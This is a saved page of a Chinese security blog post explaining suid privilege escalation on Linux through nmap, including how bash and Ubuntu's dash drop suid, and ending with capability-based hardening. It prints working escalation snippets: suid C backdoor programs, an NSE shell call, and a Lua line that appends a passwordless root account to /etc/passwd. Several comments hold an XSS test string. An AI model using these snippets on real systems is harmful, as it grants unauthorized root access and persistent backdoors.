@@ -1,0 +1,842 @@
+
+
+<html class="no-js">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。" />
+    <title>谈一谈Linux与suid提权 | 离别歌</title>
+    <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌" />
+    <link href="../static/deep/css/base.css" rel="stylesheet" type="text/css" />
+    <link href="../static/deep/css/style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" href="../static/deep/images/favicon.ico" />
+    
+<style>div.row .col-xs-4 {
+  float: left;
+  margin-left: 4px;
+}
+div.row .col-xs-4 img {
+  margin-left: 5px;
+}
+</style>
+<link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+<link rel="stylesheet" href="../static/deep/css/code.css">
+
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+<div id="header">
+    <div class="container">
+        <h1 class="h1-title">
+            <a href="../index.html">
+               <img src="../static/deep/images/logo.png" alt="离别歌" />
+            </a>
+        </h1>
+        <div id="nav">
+        <input type="checkbox" id="button">
+        <label for="button" onclick>菜单</label>
+        
+        <ul>
+            
+            <li class="item ">
+                <a href="../index.html" >首页</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../list/index.html" >文章</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/tinger.html" >关于</a>
+            </li>
+            
+            <li class="item ">
+                <a href="../other/friends-link.html" >友链</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://github.com/phith0n" target="_blank" >项目</a>
+            </li>
+            
+            <li class="item ">
+                <a href="https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html" target="_blank" >代码审计</a>
+            </li>
+            
+        </ul>
+        
+        </div>
+    </div>
+</div>
+
+<div class="banner-bar">
+    <div class="container">
+        <div class="col-12 columns">
+            <div class="place">
+                <a href="../index.html">首页</a>
+                &raquo;
+                
+                网络安全 &raquo; <a href="linux-suid-privilege-escalation.html">谈一谈Linux与suid提权</a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="container">
+    <div class="col-11 columns" id="mainbody" role="main">
+        <div class="post-single type-post">
+            <h1 class="article-h1">谈一谈Linux与suid提权</h1>
+            <div class="details-up">
+  <span class="author">作者: phithon</span>
+  
+  <span class="category">分类: <a href="../sort/PENETRATION.html">网络安全</a></span>
+  
+  <span class="date">时间: 2020-2-19 23:45</span>
+  <span class="comments-top" itemprop="interactionCount">评论：<a itemprop="discussionUrl" href="#reply-list">10条评论</a></span>
+  <span class="comments-top" itemprop="interactionCount">浏览：<a itemprop="discussionUrl" href="linux-suid-privilege-escalation.html">81201人看过</a></span>
+  
+  <span class="date">标签:
+    
+        <a href="../tag/suid.html">suid</a>
+    
+        <a href="../tag/nmap.html">nmap</a>
+    
+  </span>
+  
+</div>
+            <div class="entry">
+                <p>前几天我在<a href="https://zsxq.tricking.io/landpage/">代码审计知识星球</a>里发表了一个介绍nmap利用<code>interactive</code>模式提权的帖子：</p>
+<div class="codehilite"><pre><span></span><span class="err"># 进入nmap的交互模式</span>
+<span class="err">nmap --interactive</span>
+<span class="err"># 执行sh，提权成功</span>
+<span class="err">!sh</span>
+</pre></div>
+
+
+<p>但具体实施的时候会遇到很多有趣的问题，我们来详细研究一下。</p>
+<h2 id="suid"><a class="toclink" href="#suid">suid提权</a></h2>
+<p>说到这个话题，我们不得不先介绍一下两个东西：</p>
+<ul>
+<li>suid提权是什么</li>
+<li>nmap为什么可以使用suid提权</li>
+</ul>
+<p>通常来说，Linux运行一个程序，是使用当前运行这个程序的用户权限，这当然是合理的。但是有一些程序比较特殊，比如我们常用的ping命令。</p>
+<p>ping需要发送ICMP报文，而这个操作需要发送Raw Socket。在Linux 2.2引入<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">CAPABILITIES</a>前，使用Raw Socket是需要root权限的（当然不是说引入CAPABILITIES就不需要权限了，而是可以通过其他方法解决，这个后说），所以你如果在一些老的系统里<code>ls -al $(which ping)</code>，可以发现其权限是<code>-rwsr-xr-x</code>，其中有个s位，这就是suid：</p>
+<div class="codehilite"><pre><span></span><span class="err">root@linux:~# ls -al /bin/ping</span>
+<span class="err">-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping</span>
+</pre></div>
+
+
+<p>suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性，上述情况下，普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限。</p>
+<p>设置了s位的程序在运行时，其<strong>Effective UID</strong>将会设置为这个程序的所有者。比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0，等同于拥有了root权限。</p>
+<p>这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID：</p>
+<ul>
+<li>Real UID 执行该进程的用户实际的UID</li>
+<li>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）</li>
+<li>Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨）</li>
+</ul>
+<p>通常情况下Effective UID和Real UID相等，所以普通用户不能写入只有UID=0号才可写的<code>/etc/passwd</code>；有suid的程序启动时，Effective UID就等于二进制文件的所有者，此时Real UID就可能和Effective UID不相等了。</p>
+<p>有的同学说某某程序只要有suid权限，就可以提权，这个说法其实是不准确的。只有这个程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。</p>
+<h2 id="nmapsuid"><a class="toclink" href="#nmapsuid">nmap为什么可以用suid提权</a></h2>
+<p>常用nmap的同学就知道，如果你要进行UDP或TCP SYN扫描，需要有root权限：</p>
+<div class="codehilite"><pre><span></span>$ nmap -sU target
+You requested a scan <span class="nb">type</span> which requires root privileges.
+QUITTING!
+$ nmap -sS <span class="m">127</span>.0.0.1
+You requested a scan <span class="nb">type</span> which requires root privileges.
+QUITTING!
+</pre></div>
+
+
+<p>原因就是这些操作会用到Raw Socket。</p>
+<p>有时候你不得不使用sudo来执行nmap，但在脚本调用nmap时sudo又需要tty，有可能还要输入密码，这个限制在很多情况下会造成一些不必要的麻烦。</p>
+<p>所以，有一些管理员会给nmap加上suid权限，这样普通用户就可以随便运行nmap了。</p>
+<p>当然，增加了s位的nmap是不安全的，我们可以利用nmap提权。在nmap 5.20以前存在interactive交互模式，我们可以通过这个模式来提权：</p>
+<p><a href="../media/attachment/2020/02/19/779fcb81-c31a-43b4-809e-2caa6e9b5731.png"><img alt="image.png" src="../media/attachment/2020/02/19/779fcb81-c31a-43b4-809e-2caa6e9b5731.7028360615a7.png" /></a></p>
+<p>星球里<code>@A11risefor*</code>师傅提到，nmap 5.20以后可以通过加载自定义script的方式来执行命令：</p>
+<blockquote>
+<p>补充一个，--interactive应该是比较老版本的nmap提供的选项，最近的nmap上都没有这个选项了，不过可以写一个nse脚本，内容为<code>os.execute('/bin/sh')</code>，然后<code>nmap --script=shell.nse</code>来提权</p>
+</blockquote>
+<p>的确是一个非常及时的补充，因为现在大部分的nmap都是没有interactive交互模式了。</p>
+<p>但经过测试我们发现，这个方法启动的shell似乎仍然是当前用户的，并没有我们想象中的提权。</p>
+<h2 id="linuxshell"><a class="toclink" href="#linuxshell">Linux发行版与shell</a></h2>
+<p>我曾使用interactive模式提权成功，但是因为那个nmap版本过老，没有script支持，所以没法测试script的提权方法；同样，新的nmap支持script但又没有interactive模式，无法做直观对比，我只能先猜想提权失败的原因：</p>
+<ul>
+<li>nmap在高版本中限制了suid权限</li>
+<li>lua脚本中限制了suid权限</li>
+<li>新版Linux系统对子进程的suid权限进行了限制</li>
+</ul>
+<p>这些猜想中变量太多，所以我需要控制一下。首先我阅读了老版本nmap的源码，发现其实<code>!sh</code>执行的就是很简单的<code>system('sh')</code>，而且前面并没用丢弃Effective UID权限的操作：</p>
+<div class="codehilite"><pre><span></span><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">myargv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;!&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">cptr</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="sc">&#39;!&#39;</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">cptr</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>那么我们将这个过程抽象成这么一个C程序<code>suid.c</code>：</p>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">system</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>编译，并赋予其suid权限：</p>
+<div class="codehilite"><pre><span></span><span class="err">root@linux:/tmp# gcc suid.c -o suid</span>
+<span class="err">root@linux:/tmp# chmod +s suid</span>
+</pre></div>
+
+
+<p>接着我尝试在不同系统中，用www-data用户运行<code>./suid id</code>：</p>
+<table>
+<thead>
+<tr>
+<th>Linux发行版</th>
+<th>输出结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ubuntu 14.04</td>
+<td>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</td>
+</tr>
+<tr>
+<td>Ubuntu 16.04</td>
+<td>uid=33(www-data) gid=33(www-data) groups=33(www-data)</td>
+</tr>
+<tr>
+<td>Ubuntu 18.04</td>
+<td>uid=33(www-data) gid=33(www-data) groups=33(www-data)</td>
+</tr>
+<tr>
+<td>CentOS 6</td>
+<td>uid=33(www-data) gid=33(www-data) groups=33(www-data)</td>
+</tr>
+<tr>
+<td>CentOS 8</td>
+<td>uid=33(www-data) gid=33(www-data) groups=33(www-data)</td>
+</tr>
+<tr>
+<td>Debian 6</td>
+<td>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</td>
+</tr>
+<tr>
+<td>Debian 8</td>
+<td>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</td>
+</tr>
+<tr>
+<td>Kali 2019</td>
+<td>uid=33(www-data) gid=33(www-data) groups=33(www-data)</td>
+</tr>
+</tbody>
+</table>
+<p>可见，有些系统是root权限，有些系统仍然是原本用户权限。那么上面nmap提权失败的原因，就可以排除nmap的原因了。</p>
+<p>同样，CentOS 6和Debian 6都是较老的发行版，但CentOS 6的表现却和新版Ubuntu类似，经过网上的询问和翻文档，得到了bash中的这么<a href="https://linux.die.net/man/1/bash">一段说明</a>：</p>
+<blockquote>
+<p>If the shell is started with the effective user (group) id not equal to the real user (group) id, and the <strong>-p</strong> option is not supplied, no startup files are read, shell functions are not inherited from the environment, the <strong>SHELLOPTS</strong>, <strong>BASHOPTS</strong>, <strong>CDPATH</strong>, and <strong>GLOBIGNORE</strong> variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the <strong>-p</strong> option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.</p>
+</blockquote>
+<p>如果启动bash时的Effective UID与Real UID不相同，而且没有使用-p参数，则bash会将Effective UID还原成Real UID。</p>
+<p>我们知道，Linux的<code>system()</code>函数实际上是执行的<code>/bin/sh -c</code>，而CentOS的<code>/bin/sh</code>是指向了<code>/bin/bash</code>：</p>
+<div class="codehilite"><pre><span></span><span class="err">[root@localhost tmp]# ls -al /bin/sh </span>
+<span class="err">lrwxrwxrwx. 1 root root 4 Apr 10  2017 /bin/sh -&gt; bash</span>
+</pre></div>
+
+
+<p>这就解释了为什么CentOS中suid程序执行id获得的结果仍然是www-data。假设我们此时将sh修改成dash，看看结果是什么：</p>
+<div class="codehilite"><pre><span></span><span class="err">[root@localhost tmp]# su -s /bin/bash nobody</span>
+<span class="err">bash-4.1$ ls -al /bin/sh </span>
+<span class="err">lrwxrwxrwx. 1 root root 9 Feb 19 00:21 /bin/sh -&gt; /bin/dash</span>
+<span class="err">bash-4.1$ ./suid id</span>
+<span class="err">uid=99(nobody) gid=99(nobody) euid=0(root) egid=0(root) groups=0(root),99(nobody) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</span>
+</pre></div>
+
+
+<p>dash并没有限制Effective UID，这里可以看到成功获取了root权限。</p>
+<h2 id="ubuntu"><a class="toclink" href="#ubuntu">Ubuntu的特殊处理</a></h2>
+<p>但是，我们来看看Ubuntu 16.04，其/bin/sh指向的同样是dash：</p>
+<div class="codehilite"><pre><span></span>$ ls -al /bin/sh
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">4</span> 9月  <span class="m">18</span>  <span class="m">2016</span> /bin/sh -&gt; dash
+$ ls -al /bin/dash 
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">154072</span> 2月  <span class="m">17</span>  <span class="m">2016</span> /bin/dash
+</pre></div>
+
+
+<p>为什么仍然会出现无法提权的情况？</p>
+<p>此时我们又需要了解另一个知识了。通常来说，类似Ubuntu这样的发行版都会对一些程序进行修改，比如我们平时在查看PHP版本的时候，经常会看到这样的banner：<code>PHP 7.0.33-0ubuntu0.16.04.11</code>，在官方的版本号后会带上Ubuntu的一些版本号，这是因为Ubuntu发行版在打包这些软件时会增加一些自己的代码。</p>
+<p>那么我们可以来看看Ubuntu 16.04源中dash目录：</p>
+<p><a href="../media/attachment/2020/02/19/0a7d688c-482d-49d3-bbe3-c7155fb93e65.png"><img alt="image.png" src="../media/attachment/2020/02/19/0a7d688c-482d-49d3-bbe3-c7155fb93e65.cee4db90e5d6.png" /></a></p>
+<p>下载其中的<code>dash_0.5.8.orig.tar.gz</code>和<code>dash_0.5.8-2.1ubuntu2.diff.gz</code>并分别解压，我们可以看到dash 0.5.8的原始代码，和Ubuntu对其做的patch。</p>
+<p>我们对原始代码进行patch后，会发现多了一个<code>setprivileged</code>函数：</p>
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">setprivileged</span><span class="p">(</span><span class="kt">int</span> <span class="n">on</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">static</span> <span class="kt">int</span> <span class="n">is_privileged</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">is_privileged</span> <span class="o">==</span> <span class="n">on</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">;</span>
+
+    <span class="n">is_privileged</span> <span class="o">=</span> <span class="n">on</span><span class="p">;</span>
+
+    <span class="cm">/*</span>
+<span class="cm">     * To limit bogus system(3) or popen(3) calls in setuid binaries, require</span>
+<span class="cm">     * -p flag to work in this situation.</span>
+<span class="cm">     */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">on</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">geteuid</span><span class="p">()</span> <span class="o">||</span> <span class="n">gid</span> <span class="o">!=</span> <span class="n">getegid</span><span class="p">()))</span> <span class="p">{</span>
+        <span class="n">setuid</span><span class="p">(</span><span class="n">uid</span><span class="p">);</span>
+        <span class="n">setgid</span><span class="p">(</span><span class="n">gid</span><span class="p">);</span>
+        <span class="cm">/* PS1 might need to be changed accordingly. */</span>
+        <span class="n">choose_ps1</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p><code>on</code>的取值取决于用户是否传入了<code>-p</code>参数， 而uid和gid就是当前进程的Real UID(GID)。可见，在on为false，且Real UID 不等于Effective UID的情况下，这里重新设置了进程的UID：</p>
+<div class="codehilite"><pre><span></span><span class="n">setuid</span><span class="p">(</span><span class="n">uid</span><span class="p">)</span>
+</pre></div>
+
+
+<p>setuid函数用于设置当前进程的Effective UID，如果当前进程是root权限或拥有<code>CAP_SETUID</code>权限，则Real UID和Saved UID将被一起设置。</p>
+<p>所以，可以看出，Ubuntu发行版官方对dash进行了修改：<strong>当dash以suid权限运行、且没有指定<code>-p</code>选项时，将会丢弃suid权限，恢复当前用户权限。</strong></p>
+<p>这样以来，dash在suid的表现上就和bash相同了，这也就解释了为什么在Ubuntu 16.04以后，我们无法直接使用SUID+<code>system()</code>的方式来提权。</p>
+<h2 id="_1"><a class="toclink" href="#_1">如何突破限制？</a></h2>
+<p>同样的，你下载Debian 10最新的dash，也可以看到类似代码。那么，为什么各大发行版分分在sh中增加了这个限制呢？</p>
+<p>我们可以将其理解为是Linux针对suid提权方式的一种遏制。因为通常来说，很多命令注入漏洞都是发生在<code>system()</code>和<code>popen()</code>函数中的，而这些函数依赖于系统的/bin/sh。相比CentOS来说，Ubuntu和Debian中的sh一直都是dash，也就一直受到suid提权漏洞的影响。</p>
+<p>一旦拥有suid的程序存在命令注入漏洞或其本身存在执行命令的功能，那么就有本地提权的风险，如果在sh中增加这个限制，提权的隐患就能被极大地遏制。</p>
+<p>那么，如果我们就是要留一个具有suid的shell作为后门，我们应该怎么做？</p>
+<p>将之前的<code>suid.c</code>做如下修改：</p>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">system</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>编译和执行，我们就可以发现，id命令输出的uid就是0了：</p>
+<p><a href="../media/attachment/2020/02/19/4c99203e-112d-41f9-94d4-230ded7baa35.png"><img alt="image.png" src="../media/attachment/2020/02/19/4c99203e-112d-41f9-94d4-230ded7baa35.9e4d2c4c9062.png" /></a></p>
+<p>原因是我们将当前进程的Real UID也修改成了0，Real UID和Effective UID相等，在进入dash后就不会被降权了。</p>
+<p>另一种方法，我们可以给dash或bash增加-p选项，让其不对shell降权。但这里要注意，我们不能再使用system函数了，因为<code>system()</code>内部执行的是<code>/bin/sh -c</code>，我们只能控制-c的参数值，无法给sh中增加-p选项。</p>
+<p>这里我们可以使用<code>execl</code>或其他exec系列函数：</p>
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">,</span> <span class="s">&quot;-p&quot;</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>此时输出结果类似于Ubuntu 14.04里的结果，因为我给sh加了-p参数：</p>
+<p><a href="../media/attachment/2020/02/19/303d7f47-d2e1-4e19-be6b-b421e2e6e22c.png"><img alt="image.png" src="../media/attachment/2020/02/19/303d7f47-d2e1-4e19-be6b-b421e2e6e22c.6b9b35a4c7e7.png" /></a></p>
+<p>再回到我们最初的问题：那么具有suid权限的nmap在Ubuntu 18.04或类似系统中我们如何进行提权呢？</p>
+<p>因为nmap script中使用的是lua语言，而lua库中似乎没有直接启动进程的方式，都会依赖系统shell，所以我们可能并不能直接通过执行shell的方式来提权。但是因为此时nmap已经是root权限，我们可以通过修改<code>/etc/passwd</code>的方式来添加一个新的super user：</p>
+<div class="codehilite"><pre><span></span><span class="kd">local</span> <span class="n">file</span> <span class="o">=</span> <span class="nb">io.open</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>
+<span class="n">file</span><span class="p">:</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;root2::0:0::/root:/bin/bash</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">file</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+
+
+<p>成功提权：</p>
+<p><a href="../media/attachment/2020/02/19/60993656-8b8e-41ac-a0a8-c0db20a78e51.png"><img alt="image.png" src="../media/attachment/2020/02/19/60993656-8b8e-41ac-a0a8-c0db20a78e51.7724f5e462d8.png" /></a></p>
+<h2 id="_2"><a class="toclink" href="#_2">如何让系统变得更安全</a></h2>
+<p>作为一个系统的运维人员，我们如何来防御类似的suid提权攻击呢？</p>
+<p>当然我们需要先感谢Linux内核和Ubuntu和Debian等发行版的开发人员，他们也在慢慢帮我们不断提高系统的安全性和稳定性，但类似于nmap这样功能强大的软件，我们无法奢求一律Secure By Default，所以必须学习一些更有趣的知识。</p>
+<p>Linux 2.2以后增加了capabilities的概念，可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题，我们可以在<a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities(7) - Linux manual page</a>中看到这些特权的说明。</p>
+<p>类似于ping和nmap这样的程序，他们其实只需要网络相关的特权即可。所以，如果你在Kali下查看ping命令的capabilities，你会看到一个<code>cap_net_raw</code>：</p>
+<div class="codehilite"><pre><span></span>$ ls -al /bin/ping
+-rwxr-xr-x <span class="m">1</span> root root <span class="m">73496</span> Oct  <span class="m">5</span> <span class="m">22</span>:34 /bin/ping
+$ getcap /bin/ping
+/bin/ping <span class="o">=</span> cap_net_raw+ep
+</pre></div>
+
+
+<p>这就是为什么kali的ping命令无需设置setuid权限，却仍然可以以普通用户身份运行的原因。</p>
+<p>同样，我们也可以给nmap增加类似的capabilities：</p>
+<div class="codehilite"><pre><span></span><span class="err">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap</span>
+<span class="err">nmap --privileged -sS 192.168.1.1</span>
+</pre></div>
+
+
+<p>再次使用TCP SYN扫描时就不会出现权限错误的情况了：</p>
+<p><a href="../media/attachment/2020/02/19/5a8481bd-ca17-4754-9d97-79b1b7d5efc6.png"><img alt="image.png" src="../media/attachment/2020/02/19/5a8481bd-ca17-4754-9d97-79b1b7d5efc6.6597b466b806.png" /></a></p>
+            </div>
+            <div itemprop="keywords" class="tags-meta">
+                标签:
+                
+                    <a href="../tag/suid.html">suid</a>
+                
+                    <a href="../tag/nmap.html">nmap</a>
+                
+            </div>
+            <br>
+<!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+        <li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+        <li class="-mob-share-pocket"><p>Pocket</p></li>
+        <li class="-mob-share-google"><p>Google+</p></li>
+        <li class="-mob-share-youdao"><p>有道云笔记</p></li>
+        <li class="-mob-share-mingdao"><p>明道</p></li>
+        <li class="-mob-share-tumblr"><p>Tumblr</p></li>
+        <li class="-mob-share-instapaper"><p>Instapaper</p></li>
+        <li class="-mob-share-linkedin"><p>LinkedIn</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=af155d9007c8"></script>
+<!--MOB SHARE END-->
+
+        <div class="qqlist">
+          <h3>订阅本站<small>(RSS)</small></h3>
+          <form method="post" target="_blank" action="https://list.qq.com/cgi-bin/qf_compose_send">
+          <input type="hidden" value="qf_booked_feedback" name="t" />
+          <input type="hidden" value="dace5c2b356504de449e7f3fc2bb59f3f6124d6563786446" name="id" />
+          <input type="text" placeholder="E-mail" value="" class="rsstxt" name="to" id="to" />
+          <button type="submit" >订阅&rarr;</button>
+          </form>
+        </div>
+
+
+        </div>
+
+        
+        <div class="post-single type-post text-center">
+            <h3 style="margin-top: 0">喜欢这篇文章，扫码和我成为赞友！</h3>
+            <img src="../static/wx.jpg" width="280" alt="">
+        </div>
+        
+
+        <!-- 评论位置 -->
+        <div id="comments" class="comments">
+          <h3>已有 10 条评论</h3>
+            <ol class="comment-list">
+            
+            
+              <li class="comment-body" id="comment-3815">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">B0rn2d</a></div>
+                    <p>感谢！实践发现使用bash -p，由于uid仍不为0，会导致部分操作仍然无法进行（如mount命令），此时只能使用c程序将uid设为0然后再执行命令，即可执行Mount（环境为docker逃逸靶场）</p>
+                    <span class="comment-time">时间: 2022-02-19 12:42</span>
+                    <span class="comment-reply"><a href="#comment-3815" onclick="reply_to('3815','B0rn2d')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3809">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">刘君</a></div>
+                    <p>&lt;script&gt;alert(fuck you !!!);&lt;/script&gt;曹尼玛</p>
+                    <span class="comment-time">时间: 2022-02-11 16:37</span>
+                    <span class="comment-reply"><a href="#comment-3809" onclick="reply_to('3809','刘君')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3547">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/085daf30bedc5848bd1971e53fb3bc23.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="http://www.baicom.com" target="_blank" rel="nofollow noopener">xx</a></div>
+                    <p>&lt;script&gt;alert(fuck you !!!);&lt;/script&gt;曹尼玛</p>
+                    <span class="comment-time">时间: 2020-09-23 22:29</span>
+                    <span class="comment-reply"><a href="#comment-3547" onclick="reply_to('3547','xx')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3538">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">bingo</a></div>
+                    <p>本地测试了下7.7版本的nmap按照师傅的方法修改/etc/passwd文件，成功添加另一个root权限的账号。能写passwd文件写其他文件肯定也没问题，利用思路还有很多，不过在实战场景中不多目标机器安装有nmap，并且我测试的时候发现kali自带的nmap和debian9.5 apt安装的nmap默认都是没有设置suid的。不过从这篇文章还是学习了很多suid的知识，在实战中排查下suid的程序，感谢P师傅！！！</p>
+                    <span class="comment-time">时间: 2020-08-28 11:50</span>
+                    <span class="comment-reply"><a href="#comment-3538" onclick="reply_to('3538','bingo')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3497">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">zing</a></div>
+                    <p>https://gtfobins.github.io/gtfobins/nmap/<br>&quot;If it is used to run commands it only works on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.&quot; <br>原来这个点有挺多细节，文章很棒</p>
+                    <span class="comment-time">时间: 2020-04-01 16:38</span>
+                    <span class="comment-reply"><a href="#comment-3497" onclick="reply_to('3497','zing')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3486">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="../static/placeholder.jpg">
+                    </div>
+                    <div class="comment-meta">
+                    <div class="fn"><a href="" target="_blank" rel="nofollow noopener">路人甲</a></div>
+                    <p>经过测试，其实 都是需要在有root的权限下编译后,再执行su -s /bin/bash www-data 才会提权,直接以www-data 编译后的suid是没有用的.<br>int main(int argc, char* argv[]) {<br>    setuid(0);<br>    system(argv[1]);<br>}</p>
+                    <span class="comment-time">时间: 2020-03-11 15:37</span>
+                    <span class="comment-reply"><a href="#comment-3486" onclick="reply_to('3486','路人甲')">回复</a></span>
+                    </div>
+                </div>
+              </li>
+            
+              <li class="comment-body" id="comment-3487">
+                <div class="clearfix">
+                    <div class="comment-author">
+                        <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g">
+                    </div>
+                    <div class="comment-meta">
